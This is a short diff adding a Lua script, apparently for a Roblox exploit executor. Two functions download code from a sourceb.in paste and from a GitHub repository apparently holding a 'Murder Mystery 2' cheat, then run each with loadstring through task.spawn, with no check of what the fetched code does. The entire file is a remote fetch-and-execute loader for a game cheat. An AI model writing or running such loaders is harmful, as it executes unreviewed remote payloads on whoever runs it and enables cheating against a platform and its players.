@@ -1,0 +1,27 @@
+local function RQ1()
+    local ok, err = pcall(function()
+        local src = game:HttpGet('https://cdn.sourceb.in/bins/Nr6QzGJFS8/0')
+        print("RQ1 fetched, length:", #src)
+        local fn, loadErr = loadstring(src)
+        if not fn then
+            warn("RQ1 loadstring failed:", loadErr)
+            return
+        end
+        fn()
+    end)
+    if not ok then
+        warn("RQ1 error:", err)
+    end
+end
+
+local function RQ2()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AL1ENW4R3/Alienware-MM2/refs/heads/main/Alienware%20V1"))()
+    end)
+    if not ok then
+        warn("RQ2 error:", err)
+    end
+end
+
+task.spawn(RQ1)
+task.spawn(RQ2)
